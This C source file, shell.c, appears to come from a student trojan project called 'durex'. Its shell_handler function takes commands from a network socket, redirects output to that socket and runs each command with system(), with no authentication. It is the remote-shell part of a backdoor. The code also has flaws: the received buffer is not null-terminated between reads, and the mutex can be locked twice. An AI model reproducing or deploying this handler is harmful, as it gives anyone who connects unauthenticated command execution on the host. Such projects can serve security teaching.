/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   shell.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hivian <hivian@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/06/06 16:25:59 by hivian            #+#    #+#             */
/*   Updated: 2017/06/09 15:01:15 by hivian           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

void			*shell_handler(void *context)
{
	int			ret;
	char		buffer[BUF_SIZE];
	char		str[256];
	t_thread_params	*c = (t_thread_params*) context;
	int sock = c->csock;
	char *ip = c->cli_ip;
	int port = c->cli_port;

	bzero(str, sizeof(str));
	bzero(buffer, sizeof(buffer));
	while ((ret = recv(sock, buffer, BUF_SIZE, 0)) > 0) {
		char *trim = strtrim(buffer);
		if (!trim)
		{
			print_logs(c->logs, "Malloc error");
			continue ;
		}
		if (!strcmp(trim, "exit")) {
			ret = 0;
			break ;
		}
		dup2(sock, STDOUT_FILENO);
		dup2(sock, STDERR_FILENO);
		system(buffer);
	}
	if (ret == 0)
    {
		pthread_mutex_lock(&lock);
		c->total_connection--;
		pthread_mutex_unlock(&lock);
		snprintf(str, sizeof(str), "[Client %s:%d] disconnected.", ip, port);
		print_logs(c->logs, str);
    }
    else if (ret == -1) {
		snprintf(str, sizeof(str), "[Client %s:%d] Recv error.", ip, port);
		print_logs(c->logs, str);
	}
	pthread_mutex_lock(&lock);
	if (c->total_connection == 0) {
		c->shell_on = false;
		pthread_mutex_unlock(&lock);
		print_logs(c->logs, "Shell inactive");
	}
	pthread_mutex_lock(&lock);
	close(sock);
	pthread_mutex_unlock(&lock);
	return (NULL);
}
